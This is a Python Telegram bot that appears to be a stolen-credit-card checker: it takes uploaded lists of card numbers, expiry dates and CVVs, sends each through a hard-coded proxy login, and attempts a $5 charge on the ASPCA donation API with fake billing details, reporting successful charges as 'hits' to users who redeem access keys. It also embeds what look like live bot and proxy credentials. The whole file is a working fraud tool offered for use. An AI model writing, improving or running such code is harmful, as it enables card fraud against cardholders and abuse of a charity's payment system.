import requests, re, time, threading, json
from colorama import Fore, init
import telebot
from hh import keep_alive

init(autoreset=True)

proxies_list = ["http://naveed:Qwerty_123ABC@196.244.48.124:12345"]

def get_proxy():
    return {"http": proxies_list[0], "https": proxies_list[0]}

def ASPCA_Check(cx):
    proxy = get_proxy()
    print(Fore.YELLOW + f"[ASPCA] Checking: {cx}")
    try:
        cc, mes, ano, cvv = cx.split("|")
        if len(ano) == 4: ano = ano[2:]

        s = requests.Session()
        s.proxies = proxy
        ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'

        headers = {'User-Agent': ua, 'Content-Type': 'application/json'}

        # Get session
        s.get("https://secure.aspca.org/donate/donate", headers=headers, timeout=15)

        # Make $5 Charge
        data = {
            "amount": 5,
            "frequency": "one-time",
            "paymentMethod": {
                "type": "credit_card",
                "number": cc,
                "expirationMonth": mes,
                "expirationYear": ano,
                "cvv": cvv,
                "name": "John Doe",
                "billingAddress": {
                    "street1": "123 Main St",
                    "city": "New York",
                    "state": "NY",
                    "zip": "10001",
                    "country": "US"
                }
            }
        }

        response = s.post("https://secure.aspca.org/api/donate", json=data, headers=headers, timeout=20)

        print(Fore.BLUE + f"[RESPONSE] {response.text[:300]}")

        if response.status_code == 200 and "success" in response.text.lower():
            print(Fore.GREEN + f"[HIT] {cc} → Charged $5")
            return "✅ Charged $5 - Approved"
        elif "declined" in response.text.lower() or "insufficient" in response.text.lower():
            return "Declined"
        elif "avs" in response.text.lower():
            return "AVS Declined"
        else:
            return "Declined / Error"

    except Exception as e:
        print(Fore.RED + str(e))
        return "Error"

# ===================== BOT =====================
sto = {"stop": False}
bot = telebot.TeleBot("7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU", parse_mode="HTML")
OWNER_ID = 7077294261

redeemed_users = set()
valid_keys = {"B3-2026-PREMIUM", "SONALI123", "FREE2026", "GATEAU2026"}

@bot.message_handler(commands=["start"])
def welcome(message):
    bot.send_message(message.chat.id, "ASPCA $5 Charge API Loaded ✅")

@bot.message_handler(commands=["key"])
def redeem_key(message):
    try:
        key = message.text.split()[1]
        if key in valid_keys:
            redeemed_users.add(message.chat.id)
            bot.reply_to(message, "✅ Key Activated!")
        else:
            bot.reply_to(message, "❌ Invalid Key!")
    except:
        bot.reply_to(message, "Usage: /key YOURKEY")

@bot.message_handler(content_types=["document"])
def check(message):
    user_id = message.chat.id
    if user_id != OWNER_ID and user_id not in redeemed_users:
        return bot.reply_to(message, "❌ Access Denied!")

    sto["stop"] = False
    name = message.from_user.first_name or "User"

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    with open("combo.txt", "wb") as f: f.write(downloaded)

    with open("combo.txt") as f:
        cards = [line.strip() for line in f if line.strip()]

    ok = 0
    ko = bot.reply_to(message, f"🔥 ASPCA $5 Checking Started!\nTotal: {len(cards)}").message_id

    def worker(cc):
        nonlocal ok
        if sto["stop"]: return
        result = ASPCA_Check(cc)
        if "Charged" in result:
            ok += 1
            bot.reply_to(message, f"✅ HIT\n{cc}\n{result}")

    threads = []
    for cc in cards:
        if sto["stop"]: break
        t = threading.Thread(target=worker, args=(cc,))
        threads.append(t)
        t.start()
        time.sleep(1.2)

    for t in threads:
        t.join()

    bot.reply_to(message, f"✅ ASPCA Checking Finished!\nHits: {ok}")

@bot.message_handler(commands=["stop"])
def stopit(message):
    sto["stop"] = True
    bot.reply_to(message, "✅ Stopped")

keep_alive()
print("✅ ASPCA $5 Charge Bot Started")
bot.infinity_polling()
